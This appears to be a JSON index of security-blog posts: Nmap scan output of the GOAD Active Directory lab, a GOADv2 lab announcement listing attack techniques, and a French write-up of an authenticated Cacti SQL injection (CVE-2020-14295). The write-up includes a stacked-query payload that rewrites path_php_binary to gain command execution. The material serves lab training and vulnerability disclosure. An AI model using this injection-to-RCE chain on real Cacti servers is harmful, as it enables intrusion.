(Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:winterfell.north.sevenkingdoms.local| Not valid before: 2022-06-30T13:20:52|_Not valid after: 2023-06-30T13:20:52|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.3389/tcp open ms-wbt-server Microsoft Terminal Services| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local| Not valid before: 2022-06-27T22:49:00|_Not valid after: 2022-12-27T22:49:00|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.| rdp-ntlm-info: | Target_Name: NORTH| NetBIOS_Domain_Name: NORTH| NetBIOS_Computer_Name: WINTERFELL| DNS_Domain_Name: north.sevenkingdoms.local| DNS_Computer_Name: winterfell.north.sevenkingdoms.local| DNS_Tree_Name: sevenkingdoms.local| Product_Version: 10.0.17763|_ System_Time: 2022-07-03T15:16:36+00:005985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.05986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| tls-alpn: |_ http/1.1|_http-server-header: Microsoft-HTTPAPI/2.0|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.|_http-title: Not Found| ssl-cert: Subject: commonName=VAGRANT| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant| Not valid before: 2022-06-27T15:21:08|_Not valid after: 2025-06-26T15:21:089389/tcp open mc-nmf .NET Message Framing49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049670/tcp open msrpc Microsoft Windows RPC49672/tcp open msrpc Microsoft Windows RPC49702/tcp open msrpc Microsoft Windows RPC65091/tcp open msrpc Microsoft Windows RPCMAC Address: 08:00:27:3E:C3:EF (Oracle VirtualBox virtual NIC)Service Info: Host: WINTERFELL; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_nbstat: NetBIOS name: WINTERFELL, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 08:00:27:3e:c3:ef (Oracle VirtualBox virtual NIC)| smb2-time: | date: 2022-07-03T15:16:37|_ start_date: N/A| smb2-security-mode: | 3.1.1: |_ Message signing enabled and requiredNmap scan report for essos.local (192.168.56.12)Host is up (0.00046s latency).Not shown: 65513 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-07-03 15:15:01Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=meereen.essos.local| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:meereen.essos.local| Not valid before: 2022-06-29T08:30:39|_Not valid after: 2023-06-29T08:30:39445/tcp open microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: ESSOS)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=meereen.essos.local| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:meereen.essos.local| Not valid before: 2022-06-29T08:30:39|_Not valid after: 2023-06-29T08:30:393268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=meereen.essos.local| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:meereen.essos.local| Not valid before: 2022-06-29T08:30:39|_Not valid after: 2023-06-29T08:30:39|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=meereen.essos.local| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:meereen.essos.local| Not valid before: 2022-06-29T08:30:39|_Not valid after: 2023-06-29T08:30:39|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.3389/tcp open ms-wbt-server Microsoft Terminal Services|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=meereen.essos.local| Not valid before: 2022-06-27T22:40:08|_Not valid after: 2022-12-27T22:40:08| rdp-ntlm-info: | Target_Name: ESSOS| NetBIOS_Domain_Name: ESSOS| NetBIOS_Computer_Name: MEEREEN| DNS_Domain_Name: essos.local| DNS_Computer_Name: meereen.essos.local| DNS_Tree_Name: essos.local| Product_Version: 10.0.14393|_ System_Time: 2022-07-03T15:16:38+00:005985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.|_http-title: Not Found| ssl-cert: Subject: commonName=VAGRANT| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant| Not valid before: 2022-06-27T15:23:42|_Not valid after: 2025-06-26T15:23:42|_http-server-header: Microsoft-HTTPAPI/2.0| tls-alpn: | h2|_ http/1.19389/tcp open mc-nmf .NET Message Framing49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49677/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049678/tcp open msrpc Microsoft Windows RPC49680/tcp open msrpc Microsoft Windows RPC49693/tcp open msrpc Microsoft Windows RPC60502/tcp open msrpc Microsoft Windows RPCMAC Address: 08:00:27:33:DF:2F (Oracle VirtualBox virtual NIC)Service Info: Host: MEEREEN; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2022-07-03T15:16:38|_ start_date: 2022-07-03T13:56:01| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required|_nbstat: NetBIOS name: MEEREEN, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 08:00:27:33:df:2f (Oracle VirtualBox virtual NIC)|_clock-skew: mean: 42m00s, deviation: 2h12m50s, median: 0s| smb-security-mode: | account_used: &amp;lt;blank&amp;gt;| authentication_level: user| challenge_response: supported|_ message_signing: required| smb-os-discovery: | OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)| Computer name: meereen| NetBIOS computer name: MEEREEN\\x00| Domain name: essos.local| Forest name: essos.local| FQDN: meereen.essos.local|_ System time: 2022-07-03T08:16:38-07:00Nmap scan report for castelblack.north.sevenkingdoms.local (192.168.56.22)Host is up (0.00066s latency).Not shown: 65525 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0|_http-title: Site doesn&#39;t have a title (text/html).| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2022-07-03T13:57:05|_Not valid after: 2052-07-03T13:57:05|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.| ms-sql-ntlm-info: | Target_Name: NORTH| NetBIOS_Domain_Name: NORTH| NetBIOS_Computer_Name: CASTELBLACK| DNS_Domain_Name: north.sevenkingdoms.local| DNS_Computer_Name: castelblack.north.sevenkingdoms.local| DNS_Tree_Name: sevenkingdoms.local|_ Product_Version: 10.0.177633389/tcp open ms-wbt-server Microsoft Terminal Services| ssl-cert: Subject: commonName=castelblack.north.sevenkingdoms.local| Not valid before: 2022-06-27T22:56:08|_Not valid after: 2022-12-27T22:56:08| rdp-ntlm-info: | Target_Name: NORTH| NetBIOS_Domain_Name: NORTH| NetBIOS_Computer_Name: CASTELBLACK| DNS_Domain_Name: north.sevenkingdoms.local| DNS_Computer_Name: castelblack.north.sevenkingdoms.local| DNS_Tree_Name: sevenkingdoms.local| Product_Version: 10.0.17763|_ System_Time: 2022-07-03T15:16:40+00:00|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| ssl-cert: Subject: commonName=VAGRANT| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant| Not valid before: 2022-06-27T15:26:52|_Not valid after: 2025-06-26T15:26:52| tls-alpn: |_ http/1.1|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.0|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.49666/tcp open msrpc Microsoft Windows RPC49677/tcp open msrpc Microsoft Windows RPCMAC Address: 08:00:27:B9:6C:19 (Oracle VirtualBox virtual NIC)Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2022-07-03T15:16:38|_ start_date: N/A| ms-sql-info: | 192.168.56.22:1433: | Version: | name: Microsoft SQL Server 2019 RTM| number: 15.00.2000.00| Product: Microsoft SQL Server 2019| Service pack level: RTM| Post-SP patches applied: false|_ TCP port: 1433|_nbstat: NetBIOS name: CASTELBLACK, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 08:00:27:b9:6c:19 (Oracle VirtualBox virtual NIC)| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not requiredStats: 0:09:09 elapsed; 4 hosts completed (5 up), 1 undergoing Script ScanNSE Timing: About 99.93% done; ETC: 17:20 (0:00:00 remaining)Nmap scan report for braavos.essos.local (192.168.56.23)Host is up (0.00044s latency).Not shown: 65524 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACE|_http-title: IIS Windows Server135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM| ms-sql-ntlm-info: | Target_Name: ESSOS| NetBIOS_Domain_Name: ESSOS| NetBIOS_Computer_Name: BRAAVOS| DNS_Domain_Name: essos.local| DNS_Computer_Name: braavos.essos.local| DNS_Tree_Name: essos.local|_ Product_Version: 10.0.14393| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2022-07-03T13:57:51|_Not valid after: 2052-07-03T13:57:51|_ssl-date: 2022-07-03T15:20:40+00:00; 0s from scanner time.3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: ESSOS| NetBIOS_Domain_Name: ESSOS| NetBIOS_Computer_Name: BRAAVOS| DNS_Domain_Name: essos.local| DNS_Computer_Name: braavos.essos.local| DNS_Tree_Name: essos.local| Product_Version: 10.0.14393|_ System_Time: 2022-07-03T15:20:00+00:00| ssl-cert: Subject: commonName=braavos.essos.local| Not valid before: 2022-06-27T22:56:08|_Not valid after: 2022-12-27T22:56:08|_ssl-date: 2022-07-03T15:20:40+00:00; 0s from scanner time.5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| ssl-cert: Subject: commonName=VAGRANT| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant| Not valid before: 2022-06-27T15:30:05|_Not valid after: 2025-06-26T15:30:05| tls-alpn: | h2|_ http/1.1|_ssl-date: 2022-07-03T15:20:40+00:00; 0s from scanner time.|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.049669/tcp open msrpc Microsoft Windows RPC49685/tcp open msrpc Microsoft Windows RPC49778/tcp open msrpc Microsoft Windows RPCMAC Address: 08:00:27:A3:67:1D (Oracle VirtualBox virtual NIC)Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2022-07-03T15:20:00|_ start_date: 2022-07-03T13:57:42|_nbstat: NetBIOS name: BRAAVOS, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 08:00:27:a3:67:1d (Oracle VirtualBox virtual NIC)| ms-sql-info: | 192.168.56.23:1433: | Version: | name: Microsoft SQL Server 2019 RTM| number: 15.00.2000.00| Product: Microsoft SQL Server 2019| Service pack level: RTM| Post-SP patches applied: false|_ TCP port: 1433| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required| smb-os-discovery: | OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)| Computer name: braavos| NetBIOS computer name: BRAAVOS\\x00| Domain name: essos.local| Forest name: essos.local| FQDN: braavos.essos.local|_ System time: 2022-07-03T08:20:00-07:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_clock-skew: mean: 52m29s, deviation: 2h28m29s, median: 0sPost-scan script results:| clock-skew: | 0s: | 192.168.56.11 (winterfell.north.sevenkingdoms.local)| 192.168.56.22 (castelblack.north.sevenkingdoms.local)| 192.168.56.12 (essos.local)| 192.168.56.10 (sevenkingdoms.local)|_ 192.168.56.23 (braavos.essos.local)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 5 IP addresses (5 hosts up) scanned in 572.00 seconds Ok we now know all the hosts and service exposed, let try an anonymous enumeration in the second part: Goad pwning part2" }, { "title": "Game Of Active Directory v2", "url": "/posts/GOADv2/", "categories": "AD", "tags": "AD,, Lab", "date": "2022-07-02 00:00:00 +0200", "snippet": "The second version of Game Of Active directory is out! https://github.com/Orange-Cyberdefense/GOADI spent months to setup this new lab, with a bunch of new features and the result is finally available.With this new lab i worked to add the following features: Multi domains and multi forest: Now there is child/parent domain with sevenkingdoms.local and north.sevenkingdoms.local A separate forest as essos.local to train the forest to forest technics IIS : An IIS server is available on castelblack.north.sevenkingdoms.local with the ability to upload asp to get a shell MSSQL : Two MSSQL servers are now available, one in castelblack.north.sevenkingdoms.local and another on braavos.sevenkingdoms.local The two servers are linked to test MSSQL trusted link. Impersonation configuration are also set up on the MSSQL server Anonymous user listing: An anonymous user listing is now available in winterfell.north.sevenkingdoms.local ADCS : One of the biggest improvement of v2 with the multi domains is that an ADCS server is available on essos.local and with miss configurations to try at least esc1 to 3 and esc8. An otherview of the lab can be resumed with this chart:The global technics available on the lab are: Password reuse between computers (PTH) Spray User = Password Password in description SMB share anonymous SMB not signed Responder Zerologon Windows defender ASREPRoast Kerberoasting AD Acl abuse (forcechangepassword, genericall, genericwrite,…) Unconstraint delegation Ntlm relay Constrained delegation MSSQL exec MSSQL trusted link MSSQL impersonate IIS service to Upload malicious asp Multiples forest Anonymous RPC user listing Child parent domain escalation Certificate and ldaps avaiable ADCS - ESC 1/2/3/8 Certifry Samaccountname/nopac Petitpotam unauthent Printerbug Drop the mic Shadow credentials Printnightmare Krbrelayup …I will details those on various blog post writeup on the GOAD lab exploitation.Installation First you need a big computer to get the lab up and running. Mine is a 8cpu/32Go RAM. Maybe a 4CPU/16Go could be enough but I am really not sure about it as there is 5 windows VM to launch!git clone https://github.com/Orange-Cyberdefense/GOAD.git We start by launching vagrant to get all the vms and let vagrant provide them vagrant up Once we get all the vms up and running it’s time to provision them with ansible We install all the needed packages and launch the main.yml playbooksudo apt install python3.8-venvcd ansiblepython3.8 -m virtualenv .venvsource .venv/bin/activatepython3 -m pip install --upgrade pippython3 -m pip install ansible-core==2.12.6python3 -m pip install pywinrmansible-galaxy install -r requirements.ymlansible-playbook main.yml If there is error we just re-launch ansible-playbook main.yml until we get no failure during the installation.Lab running We check the lab with cme cme smb 192.168.56.0/24 All is ok, let’s start to pwn the lab : Goad pwning part1" }, { "title": "Active Directory Mindmap Upgrade", "url": "/posts/Upgrade-Active-Directory-mindmap/", "categories": "Mindmap", "tags": "AD,, Mindmap", "date": "2021-04-13 00:00:00 +0200", "snippet": "Light versionFull ViewDark versionFull ViewUpgrade ADCS details (thx to @Sant0rryu for his help) and ly4k for the awsome https://github.com/ly4k/Certipy tool ! Modifications on delegation details Forest to forest improvement (thx to @vikingfr for the review) Drop the av alert icon as almost all windows tools ring the av bell Add some kerberos 5 TGS hash format Add picto on cme and impacket Export is now available in svg format Add lateral move Add some abuse gpo lateral move (thx to @viking) Add some persistance methodssource code All the sources are available on the Orange Cyberdefense Arsenal repository : https://github.com/Orange-Cyberdefense/arsenal/sources thehacker.receipes ired.team hack tricks payload all the things AD-Attack-Defense harmjoy hausec.com dirkjam darthsidious casvancooten.com zer1t0.gitlab.io" }, { "title": "CACTI - RCE Authenticated (CVE-2020-14295)", "url": "/posts/Cacti-CVE-2020-14295/", "categories": "CVE", "tags": "CVE", "date": "2020-06-17 00:00:00 +0200", "snippet": "DescriptionDurant ma préparation pour l’exam de l’OSWE je cherchais un moyen de m’entrainer dans la recherche de vulnérabilités en whitebox.Du coup j’ai pris un produit open source sur étagère et j’ai commencé à chercher des vulns dessus.Après un petit peu d’analyse statique j’ai découvert le code suivant dans color.php :$sql_where = &quot;WHERE (name LIKE &#39;%&quot; . get_request_var(&#39;filter&#39;) . &quot;%&#39; Il parait évident que ce genre de code est non sécurisé pour la création d’une requête SQL (non utilisation des requêtes paramétrées mais directement une concaténation de chaine de caractères avec un paramètre issu de l’utilisateur).Une analyse des commits montre que cela touche les versions v1.2.7 à v1.2.12.Exploit On a donc une SQL injection en allant sur l’url suivante :/cacti/color.php?action=export&amp;amp;header=false&amp;amp;filter=&#39;)&amp;lt;SQLI HERE&amp;gt;--+- Je confirme en montant un cacti en local pour jouer avec BURP dessus et en activant les logs sur la base de donnée.SQLI to RCE Je me suis ensuite rendu compte que l’application accèpte les requêtes stackées (enchainement de plusieurs requêtes SQL séparées par des “;”). Ce comportement n’est pas le standard dans les applications PHP, mais quand c’est le cas il est souvent très interressant de voir jusque où l’exploitation peut aller, car on peut injecter facilement de la donnée en base. J’ai donc cherché une fonction d’exécution de code se basant sur des valeurs extraites de la base de donnée. Rapidement on se rend compte que la donnée path_php_binary issue de la configuration (table settings) est utilisées dans la création d’une commande système. function host_reindex() { global $config; $start = microtime(true); shell_exec(read_config_option(&#39;path_php_binary&#39;) . &#39; -q &#39; . $config[&#39;base_path&#39;] . &#39;/cli/poller_reindex_hosts.php --qid=all --id=&#39; . get_filter_request_var(&#39;host_id&#39;)); J’ai donc changé la requête pour modifier la valeurs dans la table settings. GET /cacti/color.php?action=export&amp;amp;header=false&amp;amp;filter=1&#39;);update+settings+set+value=&#39;touch+/tmp/sqli_from_rce;&#39;+where+name=&#39;path_php_binary&#39;;--+- Ensuite en appellant la fonction reindex (host.php?action=reindex) cela déclenche l’exécution de code à distance :et voilà !Links Orignal issue : https://github.com/Cacti/cacti/issues/3622 The metasploit exploit : https://www.exploit-db.com/exploits/49810" } ]
